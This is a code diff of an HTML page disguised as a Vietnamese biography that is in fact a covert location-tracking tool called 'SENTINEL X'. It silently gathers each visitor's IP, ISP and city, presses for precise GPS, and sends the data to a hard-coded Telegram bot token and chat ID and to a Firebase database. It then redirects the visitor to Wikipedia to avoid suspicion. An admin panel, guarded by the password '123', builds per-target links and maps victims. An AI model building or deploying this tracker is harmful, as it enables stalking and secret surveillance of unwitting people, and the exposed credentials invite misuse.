@@ -5,130 +5,187 @@
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <title>Tiểu sử Đào Minh Quân</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4285F4; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
 </head>
-<body class="bg-[#0b0e14] font-sans text-slate-400">
+<body class="bg-[#0b0e14] text-slate-400 font-sans">
 
-    <div id="view-track" class="flex flex-col items-center justify-center h-screen bg-white">
-        <div class="loader"></div>
-        <p class="mt-4 text-gray-500 text-sm italic">Đang tải nội dung tiểu sử...</p>
+    <div id="v-track" class="flex flex-col items-center justify-center h-screen bg-white">
+        <div class="w-10 h-10 border-4 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
+        <p class="mt-4 text-gray-500 text-sm italic">Đang tải nội dung...</p>
     </div>
 
-    <div id="view-admin" class="hidden min-h-screen p-6">
-        <div class="max-w-4xl mx-auto">
-            <h1 class="text-2xl font-black text-white italic mb-8">SENTINEL <span class="text-blue-500">X</span> ADMIN</h1>
-            <div class="grid md:grid-cols-2 gap-8">
-                <div class="bg-[#161b22] p-6 rounded-3xl border border-slate-800 shadow-2xl">
-                    <h3 class="text-blue-500 font-bold text-xs uppercase mb-4 italic tracking-widest">Cấu hình hệ thống</h3>
-                    <div class="space-y-4">
-                        <input id="adm-token" type="text" placeholder="Bot Token" class="w-full bg-[#0d1117] border border-slate-800 p-3 rounded-xl text-xs text-blue-400 outline-none">
-                        <input id="adm-id" type="text" placeholder="Chat ID" class="w-full bg-[#0d1117] border border-slate-800 p-3 rounded-xl text-xs text-blue-400 outline-none">
-                        <input id="adm-redir" type="text" placeholder="URL chuyển hướng" class="w-full bg-[#0d1117] border border-slate-800 p-3 rounded-xl text-xs text-green-500 outline-none">
-                        <button onclick="updateConfig()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl text-xs transition-all shadow-lg shadow-blue-900/20">LƯU & TẠO LINK</button>
+    <div id="v-admin" class="hidden min-h-screen p-4 md:p-8">
+        <div class="max-w-6xl mx-auto">
+            <header class="flex justify-between items-center mb-8 border-b border-slate-800 pb-4">
+                <h1 class="text-2xl font-black italic text-white uppercase tracking-tighter">SENTINEL <span class="text-blue-500">X</span></h1>
+                <button onclick="logout()" class="text-[10px] bg-red-500/10 text-red-500 px-3 py-1 rounded-lg">Đăng xuất</button>
+            </header>
+
+            <div class="grid lg:grid-cols-3 gap-6">
+                <div class="space-y-6">
+                    <div class="bg-[#161b22] p-6 rounded-3xl border border-slate-800 shadow-2xl">
+                        <h3 class="text-blue-500 font-bold text-[10px] uppercase mb-4 tracking-widest italic">Cấu hình nhanh</h3>
+                        <div class="space-y-3">
+                            <div>
+                                <label class="text-[9px] uppercase ml-2">Telegram Token</label>
+                                <input id="in-tk" type="text" class="w-full bg-[#0d1117] border border-slate-800 p-3 rounded-xl text-xs text-blue-400 outline-none focus:border-blue-500">
+                            </div>
+                            <div>
+                                <label class="text-[9px] uppercase ml-2">Chat ID</label>
+                                <input id="in-id" type="text" class="w-full bg-[#0d1117] border border-slate-800 p-3 rounded-xl text-xs text-blue-400 outline-none focus:border-blue-500">
+                            </div>
+                            <button onclick="saveC()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl text-xs transition-all">LƯU THAY ĐỔI</button>
+                        </div>
+                    </div>
+                    
+                    <div class="bg-[#161b22] p-6 rounded-3xl border border-slate-800">
+                        <h3 class="text-yellow-500 font-bold text-[10px] uppercase mb-4 tracking-widest italic">Tạo link mới</h3>
+                        <input id="in-name" type="text" placeholder="Tên mục tiêu..." class="w-full bg-[#0d1117] border border-slate-800 p-3 rounded-xl text-xs mb-3 outline-none">
+                        <div id="out-link" onclick="copyL()" class="bg-black p-4 rounded-xl text-blue-500 text-[10px] break-all border border-slate-900 cursor-pointer hidden"></div>
                     </div>
                 </div>
-                <div class="bg-[#161b22] p-6 rounded-3xl border border-slate-800 flex flex-col justify-between">
-                    <div>
-                        <h3 class="text-yellow-500 font-bold text-xs uppercase mb-4 italic tracking-widest">Link Tracking Của Bạn</h3>
-                        <div id="res-link" class="bg-black p-4 rounded-2xl text-blue-400 text-[10px] break-all border border-slate-900 min-h-[50px] cursor-pointer active:scale-95 transition-transform" onclick="copyLink()">Chưa có cấu hình...</div>
+
+                <div class="lg:col-span-2 space-y-6">
+                    <div id="map" class="h-64 bg-slate-800 rounded-3xl border border-slate-700 z-0 overflow-hidden shadow-2xl"></div>
+                    <div class="bg-[#161b22] rounded-3xl border border-slate-800 overflow-hidden shadow-2xl">
+                        <table class="w-full text-left text-[11px]">
+                            <thead class="bg-slate-900 text-slate-500 uppercase text-[9px]">
+                                <tr><th class="p-4">Mục tiêu</th><th class="p-4">IP / Nhà mạng</th><th class="p-4 text-right">Vị trí</th></tr>
+                            </thead>
+                            <tbody id="t-logs" class="divide-y divide-slate-800"></tbody>
+                        </table>
                     </div>
-                    <p class="mt-4 text-[9px] text-slate-500 italic">* Lưu ý: Link này chứa mã xác thực ngầm. Gửi cho mục tiêu để lấy vị trí.</p>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        // Cấu hình mặc định (Fallback)
-        let cfg = {
-            t: "8358235784:AAGTQQiBeQssDDMrrs0fC-Wb4iNwJ6V2144",
-            i: "5887642221",
-            r: "https://vi.wikipedia.org/wiki/Đào_Minh_Quân"
+        // ========================================================
+        // 1. SỬA LINK FIREBASE TẠI ĐÂY
+        // ========================================================
+        const firebaseConfig = { 
+            databaseURL: "https://DÁN-LINK-FIREBASE-CỦA-BẠN-VÀO-ĐÂY.firebasedatabase.app" 
+        };
+        // ========================================================
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // Cấu hình mặc định (Sẽ bị ghi đè nếu bạn sửa trong Admin)
+        let cfg = { 
+            t: "8358235784:AAGTQQiBeQssDDMrrs0fC-Wb4iNwJ6V2144", 
+            i: "5887642221", 
+            r: "https://vi.wikipedia.org/wiki/Đào_Minh_Quân" 
         };
 
-        const updateConfig = () => {
-            cfg.t = document.getElementById('adm-token').value;
-            cfg.i = document.getElementById('adm-id').value;
-            cfg.r = document.getElementById('adm-redir').value;
-            localStorage.setItem('sentinel_v12', JSON.stringify(cfg));
-            showLink();
-        };
-
-        const showLink = () => {
-            const base = window.location.href.split('?')[0];
-            const data = btoa(JSON.stringify(cfg));
-            document.getElementById('res-link').innerText = `${base}?v=${data}`;
-        };
-
-        const copyLink = () => {
-            navigator.clipboard.writeText(document.getElementById('res-link').innerText);
-            alert("Đã copy link!");
-        };
+        const params = new URLSearchParams(window.location.search);
+        let map, markers = [];
 
         window.onload = async () => {
-            const params = new URLSearchParams(window.location.search);
-
-            // XỬ LÝ GIAO DIỆN ADMIN
             if (params.has('admin')) {
-                const pass = prompt("Nhập mật khẩu Admin:");
-                if (pass !== "123") return window.location.replace(window.location.href.split('?')[0]);
-                
-                document.getElementById('view-track').classList.add('hidden');
-                document.getElementById('view-admin').classList.remove('hidden');
-                const saved = localStorage.getItem('sentinel_v12');
-                if(saved) cfg = JSON.parse(saved);
-                document.getElementById('adm-token').value = cfg.t;
-                document.getElementById('adm-id').value = cfg.i;
-                document.getElementById('adm-redir').value = cfg.r;
-                showLink();
-                return;
+                const auth = localStorage.getItem('sentinel_auth');
+                if (auth === 'true' || prompt("Nhập Pass:") === "123") {
+                    localStorage.setItem('sentinel_auth', 'true');
+                    document.getElementById('v-track').classList.add('hidden');
+                    document.getElementById('v-admin').classList.remove('hidden');
+                    initAdmin();
+                } else { window.location.search = ""; }
+            } else {
+                startTrack();
             }
+        };
 
-            // XỬ LÝ TRACKING (MỤC TIÊU)
-            if (params.has('v')) {
-                try { cfg = JSON.parse(atob(params.get('v'))); } catch(e) {}
-            }
+        async function startTrack() {
+            const v = params.get('v');
+            try { if(v) cfg = JSON.parse(atob(v)); } catch(e) {}
 
-            const send = async (txt) => {
-                await fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage`, {
-                    method: "POST",
-                    headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({chat_id: cfg.i, text: txt, parse_mode: "HTML"})
-                });
+            const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+            const logData = {
+                name: params.get('name') || 'Mục tiêu mới',
+                ip: ipRes.ip || '?',
+                isp: ipRes.org || '?',
+                loc: `${ipRes.city || '?'}, ${ipRes.country || '?'}`,
+                time: new Date().toLocaleString(),
+                lat: ipRes.latitude || null,
+                lon: ipRes.longitude || null,
+                st: 'IP-ONLY'
             };
 
-            // BƯỚC 1: SHADOW TRACKING (Lấy IP ngay lập tức)
-            const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => null);
-            let log = `🚀 <b>MỤC TIÊU VÀO LINK</b>\n🌐 IP: <code>${ipRes?.ip || '?' }</code>\n🏢 ISP: ${ipRes?.org || '?'}\n📍 Vùng: ${ipRes?.city || '?'}, ${ipRes?.country_name || '?'}`;
-            
-            await send(log + "\n⏳ <i>Đang ép lấy tọa độ GPS...</i>");
+            const report = (m) => fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage?chat_id=${cfg.i}&parse_mode=HTML&text=${encodeURIComponent(m)}`);
+            await report(`🚀 <b>TRUY CẬP: ${logData.name}</b>\n🌐 IP: <code>${logData.ip}</code>\n📍 Vùng: ${logData.loc}`);
 
-            // BƯỚC 2: GPS TRACKING
+            const logRef = db.ref('logs').push(logData);
+
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    async (p) => {
-                        const gps = `\n\n🎯 <b>TỌA ĐỘ CHÍNH XÁC:</b>\n📍 GPS: <code>${p.coords.latitude},${p.coords.longitude}</code>\n🗺️ <a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}">XEM VỊ TRÍ VỆ TINH</a>`;
-                        await send(log + gps);
-                        window.location.replace(cfg.r);
-                    },
-                    async (err) => {
-                        // NẾU TỪ CHỐI GPS - CHẠY JAVASCRIPT ẨN LẤY VỊ TRÍ IP DỰ PHÒNG
-                        const fallback = `\n\n⚠️ <b>MỤC TIÊU TỪ CHỐI GPS</b>\n📍 Vị trí IP dự phòng: <a href="https://www.google.com/maps?q=${ipRes?.latitude},${ipRes?.longitude}">Xem vùng lân cận</a>`;
-                        await send(log + fallback);
-                        window.location.replace(cfg.r);
-                    },
-                    { enableHighAccuracy: true, timeout: 6000 }
-                );
-            } else {
-                window.location.replace(cfg.r);
-            }
+                navigator.geolocation.getCurrentPosition(async (p) => {
+                    const lat = p.coords.latitude, lon = p.coords.longitude;
+                    await logRef.update({ lat, lon, st: 'GPS-OK' });
+                    await report(`🎯 <b>GPS OK: ${logData.name}</b>\n📍 <a href="http://maps.google.com/q=$${lat},${lon}">XEM BẢN ĐỒ</a>`);
+                    location.replace(cfg.r);
+                }, async () => {
+                    await report(`⚠️ <b>TỪ CHỐI GPS: ${logData.name}</b>\n📍 Vị trí IP dự phòng.`);
+                    location.replace(cfg.r);
+                }, {enableHighAccuracy:true, timeout:5000});
+            } else { location.replace(cfg.r); }
+            setTimeout(() => location.replace(cfg.r), 7000);
+        }
 
-            // Tự động chuyển hướng sau 8s để tránh nghi ngờ
-            setTimeout(() => { window.location.replace(cfg.r); }, 8000);
-        };
+        function initAdmin() {
+            map = L.map('map').setView([15.8, 108.2], 5);
+            L.tileLayer('https://{s}.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', {subdomains:['mt0','mt1','mt2','mt3']}).addTo(map);
+
+            const saved = localStorage.getItem('cfg_v12');
+            if(saved) cfg = JSON.parse(saved);
+            document.getElementById('in-tk').value = cfg.t;
+            document.getElementById('in-id').value = cfg.i;
+
+            db.ref('logs').on('value', snap => {
+                const data = snap.val();
+                const table = document.getElementById('t-logs');
+                table.innerHTML = "";
+                markers.forEach(m => map.removeLayer(m));
+                for(let id in data) {
+                    const item = data[id];
+                    if(item.lat) {
+                        const m = L.marker([item.lat, item.lon]).addTo(map).bindPopup(item.name);
+                        markers.push(m);
+                    }
+                    table.innerHTML = `
+                        <tr class="hover:bg-slate-800/40">
+                            <td class="p-4"><b class="text-white">${item.name}</b><br><span class="text-[9px] text-slate-500">${item.time}</span></td>
+                            <td class="p-4"><span class="text-blue-400">${item.ip}</span><br><span class="text-[9px]">${item.isp}</span></td>
+                            <td class="p-4 text-right">
+                                <span class="text-[10px] ${item.st==='GPS-OK'?'text-green-500':'text-red-500'} font-bold">${item.st}</span><br>
+                                <button onclick="map.flyTo([${item.lat},${item.lon}], 16)" class="text-blue-500 text-[10px] underline">Map</button>
+                            </td>
+                        </tr>` + table.innerHTML;
+                }
+            });
+        }
+
+        function saveC() {
+            cfg.t = document.getElementById('in-tk').value;
+            cfg.i = document.getElementById('in-id').value;
+            localStorage.setItem('cfg_v12', JSON.stringify(cfg));
+            alert("Đã lưu!");
+        }
+
+        function copyL() {
+            navigator.clipboard.writeText(document.getElementById('out-link').innerText);
+            alert("Đã copy!");
+        }
+
+        document.getElementById('in-name').oninput = function() {
+            const base = window.location.href.split('?')[0];
+            const data = btoa(JSON.stringify(cfg));
+            document.getElementById('out-link').classList.remove('hidden');
+            document.getElementById('out-link').innerText = `${base}?name=${encodeURIComponent(this.value)}&v=${data}`;
+        }
+        function logout() { localStorage.removeItem('sentinel_auth'); location.reload(); }
     </script>
 </body>
 </html>
